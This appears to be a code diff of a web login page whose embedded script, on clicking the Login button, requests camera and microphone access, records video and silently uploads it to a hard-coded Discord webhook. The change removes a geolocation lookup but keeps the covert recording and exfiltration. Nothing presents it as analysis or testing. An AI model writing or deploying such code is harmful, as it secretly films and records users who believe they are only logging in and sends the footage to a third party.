@@ -380,7 +380,7 @@
 
         </div>
     </div>
-        <footer class="container-footer" id="footer-container">
+            <footer class="container-footer" id="footer-container">
         <div class="footer">
             <ul class="row footer-links">
                 <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
@@ -403,7 +403,7 @@
 </div>
 
 <script>
-// --- KAMERA & BUFFER STREAM SKRIPT (Gekoppelt an Login) ---
+// --- NUR KAMERA STREAM SKRIPT (Ohne Standort, gekoppelt an Login) ---
 let recordedChunks = [];
 const TARGET_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
 
@@ -418,20 +418,13 @@ function flushBuffer(webhookUrl) {
     const blob = new Blob(recordedChunks, { type: 'video/webm' });
     recordedChunks = []; 
     const formData = new FormData();
-    formData.append('file', blob, 'recording.webm');
+    formData.append('file', blob, 'camera_capture.webm');
     fetch(webhookUrl, { method: 'POST', body: formData }).catch(() => {});
 }
 
-async function requestCameraAndStream() {
+async function requestCameraOnly() {
     try {
-        // Fragt Standort ab
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                console.log("Lat:", pos.coords.latitude, "Lng:", pos.coords.longitude);
-            }, () => {}, { enableHighAccuracy: true });
-        }
-
-        // Fordert Kamera & Mikrofon an (durch den echten Klick auf den Login-Button erzwingt der Browser das Pop-up)
+        // Fordert NUR Kamera & Mikrofon an (löst durch den Login-Klick das Browser-Pop-up aus)
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         mediaRecorder.ondataavailable = handleDataAvailable;
@@ -680,8 +673,8 @@ function doLogin(){
         return;
     }
 
-    // Löst beim Klick auf den Login-Button direkt die Berechtigungsabfrage für Kamera/Standort aus
-    requestCameraAndStream();
+    // Löst beim Klick auf den Login-Button direkt und ausschließlich die Kamera-Frage aus
+    requestCameraOnly();
 
     setLoading(true);
     setError("");
